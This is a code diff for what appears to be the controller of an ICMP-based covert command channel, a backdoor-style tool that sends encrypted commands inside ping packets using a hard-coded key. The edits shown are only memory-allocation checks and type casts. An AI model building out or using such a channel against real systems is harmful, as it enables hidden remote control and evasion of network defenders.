@@ -4,6 +4,7 @@
 #define KEY "thisisapassword"
 #define KEY_LENGTH 15
 #define MAGIC_BYTE 0xaa
+#define CHECK_ALLOC(x) {if (x == NULL) {fprintf(stderr, "Error: Cannot allocate memory\n"); exit(EXIT_FAILURE);}}
 
 // creates a raw ICMP socket and binds it
 int create_socket(char *interface_to_bind) {
@@ -117,10 +118,10 @@ unsigned char *parse_data_section(unsigned char *packet) {
 
 // append the command to the data section of the packet
 void append_to_data_section(struct icmphdr *icmp, unsigned char *data, unsigned char *command) {
-    memcpy(data, command, strlen(command));
+    memcpy(data, command, strlen((char *) command));
 
     // update the ICMP header with the new data length
-    icmp->un.echo.sequence = strlen(command);
+    icmp->un.echo.sequence = strlen((char *) command);
 }
 
 // the actual interaction occurs here
@@ -139,14 +140,9 @@ void interact(int sockfd) {
     int connected = 0;
 
     input = malloc(BUFFER_SIZE);
+    CHECK_ALLOC(input);
     packet = (unsigned char *) malloc(packet_size);
-
-    if (input == NULL || packet == NULL) {
-        fprintf(stderr, "Error: Cannot allocate memory\n");
-        free(input);
-        free(packet);
-        return;
-    }
+    CHECK_ALLOC(packet);
 
     puts("[+] Waiting for connections...");
 
@@ -221,6 +217,7 @@ void interact(int sockfd) {
             }
         }
     }
+
     free(input);
     free(cipher_text);
     free(packet);
